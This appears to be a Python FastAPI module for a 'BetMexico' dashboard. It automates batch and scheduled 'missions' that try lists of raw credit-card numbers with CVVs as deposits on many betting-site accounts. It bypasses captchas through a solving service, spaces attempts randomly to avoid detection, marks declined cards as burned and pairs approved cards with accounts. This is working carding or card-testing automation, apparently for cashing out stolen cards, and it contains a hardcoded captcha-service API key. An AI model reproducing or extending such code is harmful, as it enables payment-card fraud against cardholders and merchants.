#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BetMexico Web Dashboard — Missions routes (batch + scheduled).

Reglas de diseño Robert:
- Batch matchmaker: max 5 cuentas × 5 tarjetas. Por cada tarjeta del pool, intentar
  contra cada cuenta secuencialmente con gap aleatorio 3-8s.
  - Si APROBADA → vincular tarjeta↔cuenta, marcar tarjeta usada, pasar a siguiente tarjeta.
  - Si rechazo específico (TARJETA_INVALIDA, INSUFFICIENT_FUNDS, EXPIRED) → marcar tarjeta y siguiente.
  - Si rechazo genérico → seguir con siguiente cuenta.
  - Si gateway 5xx 2 veces consecutivas → PAUSE TOTAL.
- Scheduled: 1 cuenta + 1 tarjeta. Wait time = 60s entre intentos (configurable).
  - APROBADO → mission completed.
  - Rechazo → STOP inmediato (status=stopped). NO re-intentar (override manual).
- No auto-recovery tras reinicio (misiones quedan paused y operador reactiva).
"""

import asyncio
import json
import logging
import os
import random
import time
import uuid
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import StreamingResponse

from betmexico_db import db
from web_auth import authenticate
from web_utils import compute_card_fingerprint, parse_pipe_card

logger = logging.getLogger("betmexico.web.missions")

router = APIRouter(prefix="/api/missions", tags=["missions"])

# mission_id -> {"task": asyncio.Task, "queue": asyncio.Queue, "control": dict}
_RUNNING: Dict[str, Dict[str, Any]] = {}

_CARD_SPECIFIC_REJECTS = {
    "TARJETA_INVALIDA", "INSUFFICIENT_FUNDS", "EXPIRED",
    "BANK_REJECTED", "3DS_REQUIRED",
}
_GENERIC_REJECTS = {"PAYMENT_ERROR", "BEGIN_ERROR", "SHADOW_BAN?", "3DS_UNDETECTED", "CARD_CONFLICT"}
_GATEWAY_5XX = {"BEGIN_ERROR", "PAYMENT_ERROR"}


def _emit(mission_id: str, event: dict) -> None:
    state = _RUNNING.get(mission_id)
    if state:
        try:
            state["queue"].put_nowait(event)
        except Exception:
            pass


def _control_get(mission_id: str) -> dict:
    state = _RUNNING.get(mission_id)
    if not state:
        return {"status": "unknown"}
    return state["control"]


def _normalize_cards(cards_raw: List[Any]) -> List[Dict]:
    out: List[Dict] = []
    for c in cards_raw or []:
        if isinstance(c, str):
            parsed = parse_pipe_card(c)
            if parsed:
                out.append(parsed)
        elif isinstance(c, dict) and c.get("card_number"):
            try:
                yr = int(c["exp_year"])
                out.append({
                    "card_number": str(c["card_number"]).strip().replace(" ", ""),
                    "exp_month": int(c["exp_month"]),
                    "exp_year": yr if yr >= 100 else 2000 + yr,
                    "cvv": (str(c.get("cvv") or "").strip() or None),
                })
            except Exception:
                continue
    return out


async def _ensure_card_record(card: Dict, operator_id: int) -> Optional[int]:
    fingerprint = compute_card_fingerprint(card["card_number"], card["exp_month"], card["exp_year"])
    bin_v = card["card_number"][:6]
    last_4 = card["card_number"][-4:]
    return await asyncio.to_thread(
        db.create_card,
        fingerprint, card["card_number"], bin_v, last_4,
        card["exp_month"], card["exp_year"], card.get("cvv"), None, operator_id,
    )


def _classify_result(result: Dict) -> str:
    """approved | reject_card | reject_generic | gateway_5xx | login_lost | timeout"""
    if result.get("success"):
        return "approved"
    code = result.get("result_code", "")
    if code in _CARD_SPECIFIC_REJECTS:
        return "reject_card"
    if code in _GATEWAY_5XX:
        return "gateway_5xx"
    if code in ("LOGIN_FAILED", "CAPTCHA_POOL_EMPTY"):
        return "login_lost"
    if code in _GENERIC_REJECTS:
        return "reject_generic"
    return "reject_generic"


async def _persist_attempt(
    mission_id: str, batch_id: Optional[str], attempt_id: str,
    email: str, card_id: Optional[int], amount: float,
    operator_id: int, source: str, result: Dict, duration_ms: int,
) -> None:
    """Convierte el resultado de _run_deposit a un registro deposit_attempts."""
    if result.get("success"):
        status = "approved"
    elif result.get("result_code") in ("LOGIN_FAILED", "CAPTCHA_POOL_EMPTY"):
        status = "login_lost"
    elif result.get("result_code") in _GATEWAY_5XX:
        status = "gateway_error"
    elif result.get("result_code") == "TIMEOUT":
        status = "timeout"
    else:
        status = "rejected"

    await asyncio.to_thread(
        db.log_attempt,
        attempt_id=attempt_id,
        batch_id=batch_id,
        account_email=email,
        card_id=card_id,
        amount=float(amount),
        source=source,
        operator_id=operator_id,
        status=status,
        gateway_response_raw=json.dumps(result, ensure_ascii=False)[:4000],
        gateway_txn_id=result.get("txn_id"),
        balance_before=result.get("balance_before"),
        balance_after=result.get("balance_real"),
        duration_ms=duration_ms,
        rejection_reason=result.get("result_code"),
        mission_id=mission_id,
    )


# ════════════════════════════════════════════════════════════════════
# BATCH MATCHMAKER
# ════════════════════════════════════════════════════════════════════

async def _run_batch_mission(
    mission_id: str, account_emails: List[str], cards: List[Dict],
    amount: float, operator_id: int, user: dict,
) -> None:
    from web_routes_deposits import _run_deposit
    from betmexico_login_service import make_pool

    batch_id = mission_id  # 1 batch_id por misión
    db.update_mission_status(mission_id, "running")
    _emit(mission_id, {"type": "start", "accounts": len(account_emails), "cards": len(cards), "amount": amount})

    pool = make_pool(
        os.getenv("BMX_CAPMONSTER_KEY", "a9040840fdb3828ecc6090a6010afcad"),
        size=4, workers=2,
    )

    consecutive_5xx = 0
    matches: List[Dict] = []
    progress = {"total_attempts": 0, "approved": 0, "rejected": 0, "errors": 0, "matches": []}

    try:
        await pool.prefetch(2)
        await pool.start_factory()

        for card in cards:
            ctrl = _control_get(mission_id)
            if ctrl.get("status") in ("paused", "aborted"):
                logger.info(f"[Mission {mission_id}] Status {ctrl['status']} → break")
                break

            card_id = await _ensure_card_record(card, operator_id)
            card_done = False

            for email in account_emails:
                ctrl = _control_get(mission_id)
                if ctrl.get("status") in ("paused", "aborted"):
                    break

                acc = await asyncio.to_thread(db.get_account_by_email, email)
                if not acc:
                    _emit(mission_id, {"type": "skip", "email": email, "reason": "account_not_found"})
                    continue
                password = acc.get("password", "")

                attempt_id = uuid.uuid4().hex
                t0 = time.time()
                _emit(mission_id, {
                    "type": "attempt_start", "attempt_id": attempt_id,
                    "email": email, "card_last4": card["card_number"][-4:],
                })

                cc_exp_str = f"{card['exp_month']:02d}/{str(card['exp_year'])[-2:]}"
                try:
                    result = await _run_deposit(
                        email=email, password=password,
                        cc_num=card["card_number"], cc_exp=cc_exp_str,
                        cc_cvv=card.get("cvv") or "",
                        amount=float(amount), user=user, pool=pool,
                        save_card=False, check_marriage=False,
                        card_id=card_id, batch_id=batch_id, mission_id=mission_id,
                        source="dashboard_batch",
                    )
                except Exception as e:
                    logger.error(f"[Mission {mission_id}] _run_deposit excepción: {e}")
                    result = {"success": False, "result_code": "PAYMENT_ERROR", "error": str(e)}

                duration_ms = int((time.time() - t0) * 1000)
                progress["total_attempts"] += 1
                await _persist_attempt(
                    mission_id, batch_id, attempt_id, email, card_id,
                    amount, operator_id, "dashboard_batch", result, duration_ms,
                )

                kind = _classify_result(result)
                _emit(mission_id, {
                    "type": "attempt_done", "attempt_id": attempt_id,
                    "email": email, "card_last4": card["card_number"][-4:],
                    "kind": kind, "result_code": result.get("result_code"),
                    "duration_ms": duration_ms,
                })

                if kind == "approved":
                    progress["approved"] += 1
                    matches.append({"email": email, "card_id": card_id})
                    progress["matches"] = matches
                    if card_id is not None:
                        await asyncio.to_thread(db.mark_card_status, card_id, "exhausted", "matched")
                    consecutive_5xx = 0
                    card_done = True
                    break  # siguiente tarjeta

                if kind == "reject_card":
                    progress["rejected"] += 1
                    if card_id is not None:
                        await asyncio.to_thread(db.mark_card_status, card_id, "banned", result.get("result_code", "card_specific"))
                    consecutive_5xx = 0
                    card_done = True
                    break

                if kind == "gateway_5xx":
                    progress["errors"] += 1
                    consecutive_5xx += 1
                    if consecutive_5xx >= 2:
                        logger.warning(f"[Mission {mission_id}] 2x gateway 5xx → PAUSE")
                        db.update_mission_status(mission_id, "paused", json.dumps(progress),
                                                 error_message="2x gateway 5xx consecutivos")
                        _emit(mission_id, {"type": "paused", "reason": "gateway_5xx_x2"})
                        return
                    # gap y seguir
                    await asyncio.sleep(random.uniform(3.0, 8.0))
                    continue

                if kind == "login_lost":
                    progress["errors"] += 1
                    consecutive_5xx = 0
                    await asyncio.sleep(random.uniform(3.0, 8.0))
                    continue

                # reject_generic → seguir con siguiente cuenta
                progress["rejected"] += 1
                consecutive_5xx = 0
                await asyncio.sleep(random.uniform(3.0, 8.0))

            if card_done:
                # gap entre tarjetas
                await asyncio.sleep(random.uniform(3.0, 8.0))

        # Persistir progreso final
        ctrl = _control_get(mission_id)
        final_status = "aborted" if ctrl.get("status") == "aborted" else "done"
        db.update_mission_status(mission_id, final_status, json.dumps(progress))
        _emit(mission_id, {"type": "done", "progress": progress, "status": final_status})

    except Exception as e:
        logger.error(f"[Mission {mission_id}] Excepción: {e}")
        db.update_mission_status(mission_id, "error", json.dumps(progress), error_message=str(e))
        _emit(mission_id, {"type": "error", "error": str(e)})
    finally:
        try:
            await pool.stop()
        except Exception:
            pass
        # Cerrar la cola
        _emit(mission_id, {"type": "stream_end"})


# ════════════════════════════════════════════════════════════════════
# BATCH MATCHMAKER SMART (paralelo con reglas — Robert)
# ════════════════════════════════════════════════════════════════════

async def _run_batch_mission_smart(
    mission_id: str, account_emails: List[str], cards: List[Dict],
    amount: float, operator_id: int, user: dict,
) -> None:
    """
    Reglas (HARD):
      1. Par cuenta×tarjeta es único (nunca se repite)
      2. Si tarjeta falla en 2 cuentas distintas → sale del flujo
      3. Si cuenta falla con 2 tarjetas distintas → sale del flujo
      4. Tarjeta APROBADA en una cuenta → casamiento, ambas salen
      5. Rechazo card-specific (TARJETA_INVALIDA, EXPIRED, BANNED) → tarjeta out
      6. Paralelismo: min(num_cards, num_accounts, 5)
    """
    from web_routes_deposits import _run_deposit
    from betmexico_login_service import make_pool
    from web_routes_notifications import push_notification_event

    batch_id = mission_id
    db.update_mission_status(mission_id, "running")
    _emit(mission_id, {
        "type": "start", "mode": "smart",
        "accounts": len(account_emails), "cards": len(cards), "amount": amount,
    })

    pool = make_pool(
        os.getenv("BMX_CAPMONSTER_KEY", "a9040840fdb3828ecc6090a6010afcad"),
        size=5, workers=3,
    )

    # Pre-resolver card_ids y fingerprints
    card_records: List[Dict] = []
    for c in cards:
        cid = await _ensure_card_record(c, operator_id)
        from web_utils import compute_card_fingerprint
        fp = compute_card_fingerprint(c["card_number"], c["exp_month"], c["exp_year"])
        card_records.append({**c, "card_id": cid, "fingerprint": fp})

    tried_pairs: set = set()  # {(email, fingerprint)}
    card_fails: Dict[str, int] = {c["fingerprint"]: 0 for c in card_records}
    account_fails: Dict[str, int] = {e: 0 for e in account_emails}
    active_accounts = set(account_emails)
    active_cards: Dict[str, Dict] = {c["fingerprint"]: c for c in card_records}

    parallel_cap = min(len(account_emails), len(cards), 5)
    sem = asyncio.Semaphore(max(1, parallel_cap))
    progress = {"total_attempts": 0, "approved": 0, "rejected": 0, "errors": 0, "matches": []}
    in_flight: List[asyncio.Task] = []
    lock = asyncio.Lock()

    async def try_pair(email: str, card: Dict) -> None:
        fp = card["fingerprint"]
        async with sem:
            # Verificar mission status antes de gastar captcha
            m = await asyncio.to_thread(db.get_mission, mission_id)
            if m and m.get("status") == "paused":
                while True:
                    await asyncio.sleep(2)
                    m = await asyncio.to_thread(db.get_mission, mission_id)
                    if not m or m.get("status") != "paused":
                        break
            if not m or m.get("status") in ("aborted", "stopped"):
                return

            acc = await asyncio.to_thread(db.get_account_by_email, email)
            if not acc:
                async with lock:
                    active_accounts.discard(email)
                _emit(mission_id, {"type": "skip", "email": email, "reason": "account_not_found"})
                return
            password = acc.get("password", "")

            attempt_id = uuid.uuid4().hex
            t0 = time.time()
            cc_exp_str = f"{card['exp_month']:02d}/{str(card['exp_year'])[-2:]}"
            _emit(mission_id, {
                "type": "attempt_start", "attempt_id": attempt_id,
                "email": email, "card_last4": card["card_number"][-4:],
            })

            try:
                result = await _run_deposit(
                    email=email, password=password,
                    cc_num=card["card_number"], cc_exp=cc_exp_str,
                    cc_cvv=card.get("cvv") or "",
                    amount=float(amount), user=user, pool=pool,
                    save_card=False, check_marriage=False,
                    card_id=card["card_id"], batch_id=batch_id, mission_id=mission_id,
                    source="dashboard_auto",
                )
            except Exception as e:
                logger.error(f"[Mission {mission_id}] _run_deposit excep: {e}")
                result = {"success": False, "result_code": "PAYMENT_ERROR", "error": str(e)}

            duration_ms = int((time.time() - t0) * 1000)
            await _persist_attempt(
                mission_id, batch_id, attempt_id, email, card["card_id"],
                amount, operator_id, "dashboard_auto", result, duration_ms,
            )
            kind = _classify_result(result)
            async with lock:
                progress["total_attempts"] += 1
                if kind == "approved":
                    progress["approved"] += 1
                    progress["matches"].append({"email": email, "card_id": card["card_id"]})
                    # Casamiento (best-effort)
                    try:
                        await asyncio.to_thread(
                            db.register_card_to_account,
                            card["card_number"],
                            f"{card['exp_month']:02d}/{str(card['exp_year'])[-2:]}",
                            card.get("cvv") or "",
                            email, password, operator_id,
                            user.get("username", "auto"),
                        )
                    except Exception:
                        pass
                    if card["card_id"] is not None:
                        await asyncio.to_thread(db.mark_card_status, card["card_id"], "exhausted", "matched")
                    active_cards.pop(fp, None)
                    active_accounts.discard(email)
                elif kind == "reject_card":
                    progress["rejected"] += 1
                    if card["card_id"] is not None:
                        await asyncio.to_thread(
                            db.mark_card_status, card["card_id"],
                            "banned", result.get("result_code", "card_specific"),
                        )
                    active_cards.pop(fp, None)
                else:
                    if kind in ("gateway_5xx", "login_lost"):
                        progress["errors"] += 1
                    else:
                        progress["rejected"] += 1
                    card_fails[fp] = card_fails.get(fp, 0) + 1
                    account_fails[email] = account_fails.get(email, 0) + 1
                    if card_fails[fp] >= 2:
                        active_cards.pop(fp, None)
                    if account_fails[email] >= 2:
                        active_accounts.discard(email)
            _emit(mission_id, {
                "type": "attempt_done", "attempt_id": attempt_id,
                "email": email, "card_last4": card["card_number"][-4:],
                "kind": kind, "result_code": result.get("result_code"),
                "duration_ms": duration_ms,
            })

    try:
        await pool.prefetch(2)
        await pool.start_factory()

        while True:
            # Status check
            m = await asyncio.to_thread(db.get_mission, mission_id)
            if not m or m.get("status") in ("aborted", "stopped"):
                break
            if m.get("status") == "paused":
                await asyncio.sleep(2)
                continue
            if not active_accounts or not active_cards:
                break

            # Buscar siguiente par no probado
            next_pair = None
            for email in list(active_accounts):
                for fp, card in list(active_cards.items()):
                    if (email, fp) not in tried_pairs:
                        next_pair = (email, card)
                        break
                if next_pair:
                    break

            if not next_pair:
                # No hay más pares válidos por probar — esperar a que terminen los in-flight
                if in_flight:
                    await asyncio.gather(*in_flight, return_exceptions=True)
                    in_flight = []
                    continue
                break

            email, card = next_pair
            tried_pairs.add((email, card["fingerprint"]))
            await asyncio.sleep(random.uniform(3, 8))  # gap anti-quema
            t = asyncio.create_task(try_pair(email, card))
            in_flight.append(t)
            # Limpiar tasks completadas
            in_flight = [tk for tk in in_flight if not tk.done()]

        # Esperar in-flight residual
        if in_flight:
            await asyncio.gather(*in_flight, return_exceptions=True)

        m = await asyncio.to_thread(db.get_mission, mission_id)
        final_status = "aborted" if (m and m.get("status") == "aborted") else "done"
        db.update_mission_status(mission_id, final_status, json.dumps(progress))
        _emit(mission_id, {"type": "done", "progress": progress, "status": final_status})

        # Notificación
        try:
            matched = progress["approved"]
            total = len(account_emails)
            from web_routes_notifications import push_notification_event
            notif_id = await asyncio.to_thread(
                db.create_notification,
                "mission_completed",
                "Multidepósito terminado",
                f"{matched} de {total} cuentas casadas",
                json.dumps({"mission_id": mission_id, **progress}, default=str),
                int(operator_id),
                "info",
            )
            push_notification_event(int(operator_id), {
                "type": "new_notification",
                "id": notif_id,
                "notification_type": "mission_completed",
                "mission_id": mission_id,
                "approved": matched,
                "total": total,
            })
        except Exception as e:
            logger.error(f"[Mission {mission_id}] notify error: {e}")
    except Exception as e:
        logger.error(f"[Mission {mission_id}] smart excep: {e}")
        db.update_mission_status(mission_id, "error", json.dumps(progress), error_message=str(e))
        _emit(mission_id, {"type": "error", "error": str(e)})
    finally:
        try:
            await pool.stop()
        except Exception:
            pass
        _emit(mission_id, {"type": "stream_end"})


# ════════════════════════════════════════════════════════════════════
# SCHEDULED MISSION
# ════════════════════════════════════════════════════════════════════

async def _run_scheduled_mission(
    mission_id: str, email: str, card: Dict, amount: float,
    max_attempts: int, interval_seconds: int, operator_id: int, user: dict,
) -> None:
    from web_routes_deposits import _run_deposit
    from betmexico_login_service import make_pool

    db.update_mission_status(mission_id, "running")
    _emit(mission_id, {
        "type": "start", "email": email, "amount": amount,
        "max_attempts": max_attempts, "interval_seconds": interval_seconds,
    })

    pool = make_pool(
        os.getenv("BMX_CAPMONSTER_KEY", "a9040840fdb3828ecc6090a6010afcad"),
        size=2, workers=2,
    )

    progress = {"attempts_done": 0, "result_code": None, "approved": False}
    try:
        await pool.prefetch(1)
        await pool.start_factory()

        card_id = await _ensure_card_record(card, operator_id)
        acc = await asyncio.to_thread(db.get_account_by_email, email)
        if not acc:
            db.update_mission_status(mission_id, "error", json.dumps(progress), error_message="account_not_found")
            _emit(mission_id, {"type": "error", "error": "account_not_found"})
            return
        password = acc.get("password", "")
        cc_exp_str = f"{card['exp_month']:02d}/{str(card['exp_year'])[-2:]}"

        for attempt_idx in range(int(max_attempts)):
            ctrl = _control_get(mission_id)
            if ctrl.get("status") in ("paused", "aborted"):
                break

            attempt_id = uuid.uuid4().hex
            t0 = time.time()
            _emit(mission_id, {"type": "attempt_start", "attempt_id": attempt_id, "n": attempt_idx + 1})

            try:
                result = await _run_deposit(
                    email=email, password=password,
                    cc_num=card["card_number"], cc_exp=cc_exp_str,
                    cc_cvv=card.get("cvv") or "",
                    amount=float(amount), user=user, pool=pool,
                    save_card=False, check_marriage=False,
                    card_id=card_id, batch_id=None, mission_id=mission_id,
                    source="dashboard_scheduled",
                )
            except Exception as e:
                logger.error(f"[Mission {mission_id}] excepción: {e}")
                result = {"success": False, "result_code": "PAYMENT_ERROR", "error": str(e)}

            duration_ms = int((time.time() - t0) * 1000)
            progress["attempts_done"] += 1
            progress["result_code"] = result.get("result_code")
            await _persist_attempt(
                mission_id, None, attempt_id, email, card_id,
                amount, operator_id, "dashboard_scheduled", result, duration_ms,
            )

            _emit(mission_id, {
                "type": "attempt_done", "n": attempt_idx + 1,
                "result_code": result.get("result_code"),
                "approved": bool(result.get("success")),
                "duration_ms": duration_ms,
            })

            if result.get("success"):
                progress["approved"] = True
                db.update_mission_status(mission_id, "done", json.dumps(progress))
                _emit(mission_id, {"type": "done", "progress": progress, "status": "done"})
                return

            # Cualquier rechazo → STOP inmediato (regla Robert)
            db.update_mission_status(mission_id, "aborted", json.dumps(progress),
                                     error_message=f"stopped_on_reject:{result.get('result_code')}")
            _emit(mission_id, {"type": "stopped", "reason": result.get("result_code"), "progress": progress})
            return

            # (No se alcanza, queda como referencia conceptual del wait)
            # await asyncio.sleep(int(interval_seconds))

        # Salida por pausa/abort
        ctrl = _control_get(mission_id)
        final_status = "aborted" if ctrl.get("status") == "aborted" else "paused"
        db.update_mission_status(mission_id, final_status, json.dumps(progress))
        _emit(mission_id, {"type": final_status, "progress": progress})

    except Exception as e:
        logger.error(f"[Mission {mission_id}] Excepción scheduled: {e}")
        db.update_mission_status(mission_id, "error", json.dumps(progress), error_message=str(e))
        _emit(mission_id, {"type": "error", "error": str(e)})
    finally:
        try:
            await pool.stop()
        except Exception:
            pass
        _emit(mission_id, {"type": "stream_end"})


# ════════════════════════════════════════════════════════════════════
# ENDPOINTS
# ════════════════════════════════════════════════════════════════════

@router.post("/batch")
async def create_batch_mission(request: Request, user: dict = Depends(authenticate)):
    body = await request.json()
    account_emails: List[str] = body.get("account_emails") or []
    cards_raw: List[Any] = body.get("cards") or []
    amount = float(body.get("amount") or 0.0)

    if not account_emails or not cards_raw:
        raise HTTPException(status_code=400, detail="account_emails y cards requeridos")
    if len(account_emails) > 5 or len(cards_raw) > 5:
        raise HTTPException(status_code=400, detail="Max 5 cuentas × 5 tarjetas")
    if amount <= 0:
        raise HTTPException(status_code=400, detail="amount inválido")

    cards = _normalize_cards(cards_raw)
    if not cards:
        raise HTTPException(status_code=400, detail="cards inválidas")

    operator_id = int(user.get("telegram_id") or 0)
    mission_id = uuid.uuid4().hex
    config = {"account_emails": account_emails, "cards_count": len(cards), "amount": amount}
    if not db.create_mission(mission_id, "batch", operator_id, json.dumps(config)):
        raise HTTPException(status_code=500, detail="No se pudo crear misión")

    queue: asyncio.Queue = asyncio.Queue()
    control = {"status": "running"}
    smart = bool(body.get("smart") or body.get("mode") == "smart")
    runner = _run_batch_mission_smart if smart else _run_batch_mission
    task = asyncio.create_task(runner(
        mission_id, account_emails, cards, amount, operator_id, user,
    ))
    _RUNNING[mission_id] = {"task": task, "queue": queue, "control": control}
    return {"mission_id": mission_id, "type": "batch", "mode": "smart" if smart else "sequential"}


@router.post("/scheduled")
async def create_scheduled_mission(request: Request, user: dict = Depends(authenticate)):
    body = await request.json()
    email = (body.get("account_email") or "").strip()
    pipe = (body.get("card_pipe") or "").strip()
    amount = float(body.get("amount") or 0.0)
    max_attempts = int(body.get("max_attempts") or 3)
    interval_seconds = int(body.get("interval_seconds") or 60)

    if not email or not pipe or amount <= 0:
        raise HTTPException(status_code=400, detail="account_email, card_pipe y amount requeridos")

    card = parse_pipe_card(pipe)
    if not card:
        raise HTTPException(status_code=400, detail="card_pipe inválido")

    operator_id = int(user.get("telegram_id") or 0)
    mission_id = uuid.uuid4().hex
    config = {
        "email": email, "card_last4": card["card_number"][-4:],
        "amount": amount, "max_attempts": max_attempts, "interval_seconds": interval_seconds,
    }
    if not db.create_mission(mission_id, "scheduled", operator_id, json.dumps(config)):
        raise HTTPException(status_code=500, detail="No se pudo crear misión")

    queue: asyncio.Queue = asyncio.Queue()
    control = {"status": "running"}
    task = asyncio.create_task(_run_scheduled_mission(
        mission_id, email, card, amount, max_attempts, interval_seconds, operator_id, user,
    ))
    _RUNNING[mission_id] = {"task": task, "queue": queue, "control": control}
    return {"mission_id": mission_id, "type": "scheduled"}


@router.get("")
async def list_missions(user: dict = Depends(authenticate), status: Optional[str] = None):
    operator_id = int(user.get("telegram_id") or 0)
    role = user.get("role", "user")
    missions = await asyncio.to_thread(db.get_missions, operator_id, role, status)
    return {"missions": missions, "count": len(missions)}


@router.get("/{mission_id}")
async def get_mission_detail(mission_id: str, user: dict = Depends(authenticate)):
    mission = await asyncio.to_thread(db.get_mission, mission_id)
    if not mission:
        raise HTTPException(status_code=404, detail="Misión no encontrada")
    role = user.get("role", "user")
    if role != "superadmin" and int(mission.get("operator_id") or 0) != int(user.get("telegram_id") or 0):
        raise HTTPException(status_code=404, detail="Misión no encontrada")
    return mission


@router.post("/{mission_id}/pause")
async def pause_mission(mission_id: str, user: dict = Depends(authenticate)):
    state = _RUNNING.get(mission_id)
    if state:
        state["control"]["status"] = "paused"
    db.update_mission_status(mission_id, "paused")
    return {"ok": True, "mission_id": mission_id, "status": "paused"}


@router.post("/{mission_id}/resume")
async def resume_mission(mission_id: str, user: dict = Depends(authenticate)):
    # Resume manual: el operador debe relanzar (las misiones no auto-recover por diseño)
    db.update_mission_status(mission_id, "running")
    return {"ok": True, "mission_id": mission_id, "status": "running",
            "note": "Las misiones no auto-recover; relanza la misión si fue interrumpida por reinicio."}


@router.post("/{mission_id}/stop")
async def stop_mission(mission_id: str, user: dict = Depends(authenticate)):
    state = _RUNNING.get(mission_id)
    if state:
        state["control"]["status"] = "aborted"
        try:
            state["task"].cancel()
        except Exception:
            pass
    db.update_mission_status(mission_id, "aborted")
    return {"ok": True, "mission_id": mission_id, "status": "aborted"}


@router.get("/{mission_id}/stream")
async def stream_mission(mission_id: str, user: dict = Depends(authenticate)):
    """SSE de eventos de la misión en tiempo real."""
    mission = await asyncio.to_thread(db.get_mission, mission_id)
    if not mission:
        raise HTTPException(status_code=404, detail="Misión no encontrada")
    role = user.get("role", "user")
    if role != "superadmin" and int(mission.get("operator_id") or 0) != int(user.get("telegram_id") or 0):
        raise HTTPException(status_code=404, detail="Misión no encontrada")

    state = _RUNNING.get(mission_id)
    if not state:
        # Misión no activa (terminada o no en memoria) → emitir snapshot final y cerrar
        async def _empty():
            payload = {"type": "snapshot", "mission": mission}
            yield f"data: {json.dumps(payload, default=str)}\n\n"
            yield "data: {\"type\": \"stream_end\"}\n\n"
        return StreamingResponse(_empty(), media_type="text/event-stream",
                                 headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})

    queue = state["queue"]

    async def event_generator():
        try:
            while True:
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30.0)
                except asyncio.TimeoutError:
                    yield "data: {\"type\": \"ping\"}\n\n"
                    continue
                yield f"data: {json.dumps(event, default=str)}\n\n"
                if event.get("type") == "stream_end":
                    break
        except (asyncio.CancelledError, GeneratorExit):
            pass

    return StreamingResponse(event_generator(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
